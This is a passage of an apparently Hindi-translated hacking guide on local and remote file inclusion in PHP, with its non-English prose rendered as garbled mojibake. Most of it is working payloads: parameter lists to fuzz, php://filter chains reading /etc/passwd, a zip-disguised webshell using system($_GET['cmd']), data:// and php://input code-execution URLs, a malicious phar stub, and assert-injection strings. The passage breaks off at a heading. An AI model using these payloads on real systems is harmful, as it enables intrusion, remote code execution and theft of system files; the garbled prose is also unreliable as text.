[рдбреЙрдХреНрд╕ рдХреЗ рдЕрдиреБрд╕рд╛рд░](https://docs.python.org/3.10/library/os.path.html#os.path.join) рдпрд╣ рдЗрд░рд╛рджрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рд╣реИ:

> рдпрджрд┐ рдХреЛрдИ рдШрдЯрдХ рдПрдХ рдкреВрд░реНрдг рдкрде рд╣реИ, рддреЛ рд╕рднреА рдкрд┐рдЫрд▓реЗ рдШрдЯрдХреЛрдВ рдХреЛ рдлреЗрдВрдХ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдкреВрд░реНрдг рдкрде рдШрдЯрдХ рд╕реЗ рдЬреБрдбрд╝рдирд╛ рдЬрд╛рд░реА рд░рд╣рддрд╛ рд╣реИред

## Java рд╕реВрдЪреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ

рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ Java рдореЗрдВ Path Traversal рд╣реИ рдФрд░ рдЖрдк **рдлрд╛рдЗрд▓ рдХреЗ рдмрдЬрд╛рдп рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддреЗ рд╣реИрдВ**, рддреЛ **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рд╕реВрдЪреА рд╡рд╛рдкрд╕ рдХрд░ рджреА рдЬрд╛рддреА рд╣реИ**ред рдпрд╣ рдЕрдиреНрдп рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рдирд╣реАрдВ рд╣реЛрдЧрд╛ (рдЬрд╣рд╛рдБ рддрдХ рдореБрдЭреЗ рдкрддрд╛ рд╣реИ)ред

## рд╢реАрд░реНрд╖ 25 рдкреИрд░рд╛рдореАрдЯрд░

рдпрд╣рд╛рдБ рд╢реАрд░реНрд╖ 25 рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреА рд╕реВрдЪреА рд╣реИ рдЬреЛ рд╕реНрдерд╛рдиреАрдп рдлрд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI) рднреЗрджреНрдпрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ ([рд▓рд┐рдВрдХ](https://twitter.com/trbughunters/status/1279768631845494787) рд╕реЗ):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП PHP wrappers & protocols

### php://filter

PHP рдлрд┐рд▓реНрдЯрд░реНрд╕ рдбреЗрдЯрд╛ рдкрд░ **рд╕рдВрд╢реЛрдзрди рдХрд╛рд░реНрдп** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдЗрд╕реЗ рдкрдврд╝рдиреЗ рдпрд╛ рд▓рд┐рдЦрдиреЗ рд╕реЗ рдкрд╣рд▓реЗред рдлрд┐рд▓реНрдЯрд░реНрд╕ рдХреА 5 рд╢реНрд░реЗрдгрд┐рдпрд╛рдБ рд╣реИрдВ:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: рдбреЗрдЯрд╛ рд╕реЗ рдЯреИрдЧреНрд╕ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ (рдЬреЛ рдХреБрдЫ рднреА "<" рдФрд░ ">" рдЪрд┐рд╣реНрдиреЛрдВ рдХреЗ рдмреАрдЪ рд╣реИ)
* рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдлрд┐рд▓реНрдЯрд░ PHP рдХреЗ рдЖрдзреБрдирд┐рдХ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рд╕реЗ рдЧрд╛рдпрдм рд╣реЛ рдЧрдпрд╛ рд╣реИ
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : рдЕрд▓рдЧ рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рддрд╛ рд╣реИ(`convert.iconv.<input_enc>.<output_enc>`)ред рд╕рдорд░реНрдерд┐рдд **рд╕рднреА рдПрдиреНрдХреЛрдбрд┐рдВрдЧреНрд╕ рдХреА рд╕реВрдЪреА** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдВрд╕реЛрд▓ рдореЗрдВ рдЪрд▓рд╛рдПрдБ: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` рдХрдиреНрд╡рд░реНрдЬрди рдлрд┐рд▓реНрдЯрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдордирдорд╛рдирд╛ рдкрд╛рда рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬреЛ рдХрд┐ рдордирдорд╛рдирд╛ рдкрд╛рда рд▓рд┐рдЦрдиреЗ рдпрд╛ рдЬреИрд╕реЗ рдХрд┐ include рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдлрдВрдХреНрд╢рди рдХреЛ рдордирдорд╛рдирд╛ рдкрд╛рда рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) рджреЗрдЦреЗрдВред
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕рдВрдкреАрдбрд╝рд┐рдд рдХрд░рддрд╛ рд╣реИ (рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА)
* `zlib.inflate`: рдбреЗрдЯрд╛ рдХреЛ рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рдХрд░рддрд╛ рд╣реИ
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Deprecated
* `mdecrypt.*` : Deprecated
* рдЕрдиреНрдп рдлрд┐рд▓реНрдЯрд░реНрд╕
* PHP рдореЗрдВ `var_dump(stream_get_filters());` рдЪрд▓рд╛рдиреЗ рд╕реЗ рдЖрдк рдХреБрдЫ **рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдлрд┐рд▓реНрдЯрд░реНрд╕** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
* `consumed`
* `dechunk`: HTTP chunked encoding рдХреЛ рдЙрд▓рдЯ рджреЗрддрд╛ рд╣реИ
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,┬гhellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
рднрд╛рдЧ "php://filter" рдХреЗрд╕ рдЗрдирд╕реЗрдВрд╕рд┐рдЯрд┐рд╡ рд╣реИ
{% endhint %}

### php://fd

рдпрд╣ рд░реИрдкрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдЦреЛрд▓реЗ рдЧрдП рдлрд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЦреБрд▓реА рд╣реБрдИ рдлрд╛рдЗрд▓реЛрдВ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
### zip:// рдФрд░ rar://

Zip рдпрд╛ Rar рдлрд╝рд╛рдЗрд▓ рдХреЛ PHPShell рдХреЗ рд╕рд╛рде рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВред\
rar рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ **рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
рдордЬреЗрджрд╛рд░ рддрдереНрдп: рдЖрдк `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ XSS рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ Chrome Auditor рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ php рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди **`allow_url_open`** рдФрд░ **`allow_url_include`** рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реИред

### expect://

Expect рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдореЗрдВ рдЕрдкрдирд╛ рдкреЗрд▓реЛрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

`.phar` рдлрд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ PHP рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рд╡реЗрдм рдХрд┐рд╕реА рдлрдВрдХреНрд╢рди рдЬреИрд╕реЗ рдХрд┐ `include` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИред

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

рдФрд░ рдЖрдк `phar` рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рд╕рдВрдХрд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
php --define phar.readonly=0 create_path.php
```
`test.phar` рдирд╛рдордХ рдлрд╛рдЗрд▓ рдмрдирд╛рдИ рдЬрд╛рдПрдЧреА рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдк LFI рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ LFI рдХреЗрд╡рд▓ рдлрд╛рдЗрд▓ рдХреЛ рдкрдврд╝ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЙрд╕рдореЗрдВ рдореМрдЬреВрдж php рдХреЛрдб рдХреЛ рдирд╣реАрдВ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _**file\_get\_contents(), fopen(), file() рдпрд╛ file\_exists(), md5\_file(), filemtime() рдпрд╛ filesize()**_** рдЬреИрд╕реЗ рдлрдВрдХреНрд╢рдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдПред** рдЖрдк **phar** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП **рдлрд╛рдЗрд▓** рдкрдврд╝рддреЗ рд╕рдордп рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ **deserialization** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рдкрдврд╝реЗрдВ:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### рдФрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓

рдпрд╣рд╛рдВ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд[ **рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory рдФрд░ php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) тАФ рдореЗрдореЛрд░реА рдпрд╛ рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦреЗрдВ (рдпрд╣ рдлрд╛рдЗрд▓ рдЗрдирдХреНрд▓реВрдЬрди рдЕрдЯреИрдХ рдореЗрдВ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдирд╣реАрдВ рд╣реИ)
* [file://](https://www.php.net/manual/en/wrappers.file.php) тАФ рд╕реНрдерд╛рдиреАрдп рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ
* [http://](https://www.php.net/manual/en/wrappers.http.php) тАФ HTTP(s) URLs рддрдХ рдкрд╣реБрдВрдЪ
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) тАФ FTP(s) URLs рддрдХ рдкрд╣реБрдВрдЪ
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) тАФ рд╕рдВрдкреАрдбрд╝рди рд╕реНрдЯреНрд░реАрдореНрд╕
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) тАФ рдкреИрдЯрд░реНрди рд╕реЗ рдореЗрд▓ рдЦрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкрдердирд╛рдо рдЦреЛрдЬреЗрдВ (рдпрд╣ рдХреБрдЫ рднреА рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдирд╣реАрдВ рд▓реМрдЯрд╛рддрд╛, рдЗрд╕рд▓рд┐рдП рдпрд╣рд╛рдВ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) тАФ рд╕рд┐рдХреНрдпреЛрд░ рд╢реЗрд▓ 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) тАФ рдСрдбрд┐рдпреЛ рд╕реНрдЯреНрд░реАрдореНрд╕ (рдордирдорд╛рдиреА рдлрд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ)

## PHP рдХреЗ 'assert' рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ LFI

рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рдХрдард┐рди LFI рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝рддрд╛ рд╣реИ рдЬреЛ ".." рдЬреИрд╕реЗ рдЯреНрд░реИрд╡рд░реНрд╕рд▓ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рдлрд┐рд▓реНрдЯрд░ рдХрд░рддрд╛ рдкреНрд░рддреАрдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ "Hacking attempt" рдпрд╛ "Nice try!" рдЬреИрд╕реЗ рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ, рддреЛ 'assert' рдЗрдВрдЬреЗрдХреНрд╢рди рдкреЗрд▓реЛрдб рдХрд╛рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рддрд░рд╣ рдХрд╛ рдкреЗрд▓реЛрдб:
```
' and die(show_source('/etc/passwd')) or '
```
рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ PHP рдХреЛрдб рдХрд╛ рджреЛрд╣рди рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ "file" рдкреИрд░рд╛рдореАрдЯрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджрд┐рдЦрддрд╛ рд╣реИ:
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ "assert" рдХрдерди рдореЗрдВ system() рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:
```
' and die(system("whoami")) or '
```
Payloads рдХреЛ рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЙрдиреНрд╣реЗрдВ URL-encode рдЕрд╡рд╢реНрдп рдХрд░реЗрдВред

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдФрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**Hacking Insights**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдкрд░ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

**Real-Time Hack News**\
рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рдиреНрдпреВрдЬрд╝ рдФрд░ рдЗрдирд╕рд╛рдЗрдЯреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реИрдХрд┐рдВрдЧ рдХреА рддреЗрдЬрд╝реА рд╕реЗ рдмрджрд▓рддреА рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдЕрдкрдбреЗрдЯ рд░рд╣реЗрдВ

**Latest Announcements**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреАрдЬрд╝ рд▓реЙрдиреНрдЪрд┐рдВрдЧ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЕрдкрдбреЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

[**Discord**](https://discord.com/invite/N3FrSbmwdy) рдкрд░ рд╣рдорд╕реЗ рдЬреБрдбрд╝реЗрдВ рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

## PHP Blind Path Traversal

{% hint style="warning" %}
рдпрд╣ рддрдХрдиреАрдХ рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╣реИ рдЬрд╣рд╛рдВ рдЖрдк **file path** рдХреЛ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдПрдХ **PHP function** **access** рдХрд░реЗрдЧрд╛ рд▓реЗрдХрд┐рди рдЖрдк рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдирд╣реАрдВ рджреЗрдЦ рдкрд╛рдПрдВрдЧреЗ (рдЬреИрд╕реЗ рдХрд┐ **`file()`** рдХреЗ рд╕рд╛рдзрд╛рд░рдг рдХреЙрд▓) рд▓реЗрдХрд┐рди рд╕рд╛рдордЧреНрд░реА рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддреА рд╣реИред
{% endhint %}

[**рдЗрд╕ рдЕрджреНрднреБрдд рдкреЛрд╕реНрдЯ**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рдмреНрд▓рд╛рдЗрдВрдб рдкрд╛рде рдЯреНрд░реИрд╡рд░реНрд╕рд▓ рдХреЛ PHP рдлрд┐рд▓реНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **рдПрдХ рдПрд░рд░ рдСрд░реЗрдХрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХреЗ**ред

рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рддрдХрдиреАрдХ **"UCS-4LE" encoding** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЗрддрдирд╛ **рдмрдбрд╝рд╛** рдмрдирд╛ рджреЗрддреА рд╣реИ рдХрд┐ **PHP function рдлрд╛рдЗрд▓** рдЦреЛрд▓рддреЗ рд╕рдордп рдПрдХ **рдПрд░рд░** рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред

рдлрд┐рд░, рдкрд╣рд▓реЗ рдЪрд░ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд┐рд▓реНрдЯрд░ **`dechunk`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЕрдиреНрдп рдЬреИрд╕реЗ рдХрд┐ **base64** рдпрд╛ **rot13** рдХреЗ рд╕рд╛рде рдФрд░ рдЕрдВрдд рдореЗрдВ рдлрд┐рд▓реНрдЯрд░реНрд╕ **convert.iconv.UCS-4.UCS-4LE** рдФрд░ **convert.iconv.UTF16.UTF-16BE** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЕрдиреНрдп рдЪрд░реНрд╕ рдХреЛ рд╢реБрд░реБрдЖрдд рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд▓реАрдХ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

**рдЬреЛ рдлрдВрдХреНрд╢рдиреНрд╕ рд╡рд▓реНрдирд░реЗрдмрд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

рддрдХрдиреАрдХреА рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рджреЗрдЦреЗрдВ!

## LFI2RCE

### Remote File Inclusion

рдкрд╣рд▓реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛, [**рдЗрд╕ рд▓рд┐рдВрдХ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**](./#remote-file-inclusion).

### Apache/Nginx рд▓реЙрдЧ рдлрд╛рдЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

